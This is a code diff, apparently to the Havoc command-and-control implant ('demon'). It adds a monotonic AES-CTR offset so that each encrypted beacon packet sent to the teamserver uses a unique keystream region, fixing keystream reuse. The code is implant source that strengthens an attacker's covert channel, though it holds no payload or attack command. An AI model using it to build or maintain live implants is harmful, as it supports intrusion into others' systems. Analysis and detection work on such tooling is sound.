@@ -225,15 +225,54 @@ VOID PackageDestroy(
     }
 }
 
+/* Advance a 128-bit big-endian AES-CTR IV by Blocks counter positions.
+ * The IV is 16 bytes with byte 0 as the most-significant byte.
+ * Used to seek to the correct keystream offset for monotonic CTR mode. */
+static VOID AdvanceIvByBlocks( PUINT8 Iv, UINT64 Blocks )
+{
+    UINT64 Lo;
+    UINT64 Hi;
+    UINT64 NewLo;
+
+    if ( Blocks == 0 )
+        return;
+
+    /* Read the current 128-bit counter as two 64-bit big-endian halves.
+     * Bytes 0-7 are the high half; bytes 8-15 are the low half. */
+    Lo = ( (UINT64)Iv[ 8] << 56 ) | ( (UINT64)Iv[ 9] << 48 ) |
+         ( (UINT64)Iv[10] << 40 ) | ( (UINT64)Iv[11] << 32 ) |
+         ( (UINT64)Iv[12] << 24 ) | ( (UINT64)Iv[13] << 16 ) |
+         ( (UINT64)Iv[14] <<  8 ) | ( (UINT64)Iv[15]       );
+    Hi = ( (UINT64)Iv[ 0] << 56 ) | ( (UINT64)Iv[ 1] << 48 ) |
+         ( (UINT64)Iv[ 2] << 40 ) | ( (UINT64)Iv[ 3] << 32 ) |
+         ( (UINT64)Iv[ 4] << 24 ) | ( (UINT64)Iv[ 5] << 16 ) |
+         ( (UINT64)Iv[ 6] <<  8 ) | ( (UINT64)Iv[ 7]       );
+
+    /* Add Blocks to the low half; propagate carry to the high half. */
+    NewLo = Lo + Blocks;
+    if ( NewLo < Lo )
+        Hi++;
+
+    Iv[ 0] = (UINT8)( Hi    >> 56 ); Iv[ 1] = (UINT8)( Hi    >> 48 );
+    Iv[ 2] = (UINT8)( Hi    >> 40 ); Iv[ 3] = (UINT8)( Hi    >> 32 );
+    Iv[ 4] = (UINT8)( Hi    >> 24 ); Iv[ 5] = (UINT8)( Hi    >> 16 );
+    Iv[ 6] = (UINT8)( Hi    >>  8 ); Iv[ 7] = (UINT8)( Hi          );
+    Iv[ 8] = (UINT8)( NewLo >> 56 ); Iv[ 9] = (UINT8)( NewLo >> 48 );
+    Iv[10] = (UINT8)( NewLo >> 40 ); Iv[11] = (UINT8)( NewLo >> 32 );
+    Iv[12] = (UINT8)( NewLo >> 24 ); Iv[13] = (UINT8)( NewLo >> 16 );
+    Iv[14] = (UINT8)( NewLo >>  8 ); Iv[15] = (UINT8)( NewLo       );
+}
+
 // used to send the demon's metadata
 BOOL PackageTransmitNow(
     _Inout_ PPACKAGE Package,
     OUT    PVOID*   Response,
     OUT    PSIZE_T  Size
 ) {
-    AESCTX AesCtx  = { 0 };
-    BOOL   Success = FALSE;
-    UINT32 Padding = 0;
+    AESCTX AesCtx   = { 0 };
+    UINT8  OffsetIv[ AES_BLOCKLEN ];
+    BOOL   Success  = FALSE;
+    UINT32 Padding  = 0;
 
     if ( Package )
     {
@@ -254,7 +293,14 @@ BOOL PackageTransmitNow(
                 Padding += 32 + 16;
             }
 
-            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+            /* Monotonic CTR: seek to the accumulated global block offset so
+             * each packet uses a unique, non-overlapping keystream region.
+             * DEMON_INITIALIZE is always at offset 0 (the teamserver decrypts
+             * it from offset 0 using the raw key/IV from the plaintext prefix). */
+            MemCopy( OffsetIv, Instance->Config.AES.IV, AES_BLOCKLEN );
+            AdvanceIvByBlocks( OffsetIv, Instance->Config.AES.CtrBlockOffset );
+
+            AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
@@ -264,9 +310,20 @@ BOOL PackageTransmitNow(
             PUTS_DONT_SEND("TransportSend failed!")
         }
 
+        /* Advance the global CTR block offset after a successful send so the
+         * next packet starts at the correct keystream position.  Skip this for
+         * DEMON_INITIALIZE: the teamserver always decrypts INIT at block 0 and
+         * registers the agent with ctr_block_offset = 0. */
+        if ( Success && Package->Encrypt && Package->CommandID != DEMON_INITIALIZE ) {
+            Instance->Config.AES.CtrBlockOffset +=
+                ( (SIZE_T)( Package->Length - Padding ) + AES_BLOCKLEN - 1 ) / AES_BLOCKLEN;
+        }
+
         if ( Package->Destroy ) {
             PackageDestroy( Package ); Package = NULL;
         } else if ( Package->Encrypt ) {
+            /* Re-init with the same OffsetIv to restore the plaintext buffer. */
+            AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
     } else {
@@ -386,8 +443,13 @@ BOOL PackageTransmitAll(
     */
     Padding = sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 ) + sizeof( UINT32 );
 
-    // encrypt the package
-    AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+    // encrypt the package — seek to the monotonic CTR offset first
+    {
+        UINT8 OffsetIv[ AES_BLOCKLEN ];
+        MemCopy( OffsetIv, Instance->Config.AES.IV, AES_BLOCKLEN );
+        AdvanceIvByBlocks( OffsetIv, Instance->Config.AES.CtrBlockOffset );
+        AesInit( &AesCtx, Instance->Config.AES.Key, OffsetIv );
+    }
     AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
 
     // send it
@@ -395,6 +457,12 @@ BOOL PackageTransmitAll(
         Success = TRUE;
     } else {
         PUTS_DONT_SEND("TransportSend failed!")
+    }
+
+    /* Advance the global CTR block offset after a successful send. */
+    if ( Success ) {
+        Instance->Config.AES.CtrBlockOffset +=
+            ( (SIZE_T)( Package->Length - Padding ) + AES_BLOCKLEN - 1 ) / AES_BLOCKLEN;
     }
 
     // decrypt the package
